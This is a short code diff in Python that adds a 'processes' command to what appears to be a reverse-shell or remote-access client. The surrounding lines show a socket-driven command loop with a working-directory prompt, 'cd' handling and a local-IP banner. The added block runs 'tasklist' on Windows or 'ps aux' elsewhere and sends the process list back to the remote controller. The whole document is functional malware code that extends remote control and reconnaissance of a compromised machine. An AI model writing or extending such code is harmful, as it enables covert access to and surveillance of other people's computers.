@@ -252,6 +252,20 @@ Local IP: {local_ip}
                     s.send(info.encode() + os.getcwd().encode() + b"> ")
                     continue
                 
+                if cmd == "processes":
+                    info = "=== Running Processes ===\n"
+                    try:
+                        if platform.system() == 'Windows':
+                            result = subprocess.run(['tasklist'], capture_output=True, text=True, timeout=15)
+                        else:
+                            result = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=15)
+                        info += result.stdout
+                    except Exception as e:
+                        info += f"Error getting processes: {str(e)}\n"
+                    
+                    s.send(info.encode() + os.getcwd().encode() + b"> ")
+                    continue
+                
                 if data[:2].decode("utf-8") == 'cd':
                     try:
                         os.chdir(data[3:].decode("utf-8"))
